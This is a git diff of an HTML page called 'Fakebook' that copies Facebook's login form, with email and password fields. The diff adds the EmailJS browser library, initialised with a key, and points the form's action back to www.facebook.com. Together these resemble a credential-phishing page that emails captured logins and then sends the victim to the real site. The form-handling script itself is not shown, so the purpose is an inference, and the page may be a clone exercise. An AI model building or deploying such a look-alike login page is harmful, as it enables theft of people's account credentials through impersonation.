@@ -6,12 +6,22 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+    <!-- EmailJs cdn -->
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("OJYeijTeomJyu2NsM");
+   })();
+</script>
+
     <!-- Linking Section-->
     <script src="./app.js"></script>
     <link rel="stylesheet" href="style.css">
 
     <!--Favicon image-->
-    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
     <title>Fakebook</title>
 </head>
 <body>
@@ -25,7 +35,7 @@
         
         <!-- Basically the form-->
 <div class="blue">
-<form class="form1" >
+<form class="form1" action="www.facebook.com">
     <input type="text" name="email" id="emailtxt" class="emailtxt" placeholder="Email Address or Mobile Number" required="true" autocomplete="email" >
 
     <input type="password" name="password" id="passtxt" class="passtxt" autocomplete="current-password" placeholder="Password" required="true" value="">
@@ -34,11 +44,16 @@
     
 </form>
 
-  <h6>Forgotten password?</h6>
+  <h6 class="forgotpass">Forgotten password?</h6>
 
-  <h5 class="or">or</h5>
+  <div class="vertigo">
+    <hr>
+    <h5 class="or">or</h5>
+    <hr>
+  </div>
+  
 
-  <button>Create a new Account</button>
+  <button>Create a New Account</button>
 
 
 </div>
@@ -47,8 +62,10 @@
     
 </div>
 
-<!--Bottom Section-->
-    <div class="bottom"></div>
+<!--Bottom Section with diffrent Languages-->
+    <div class="bottom">
+
+    </div>
 
 </body>
 </html>
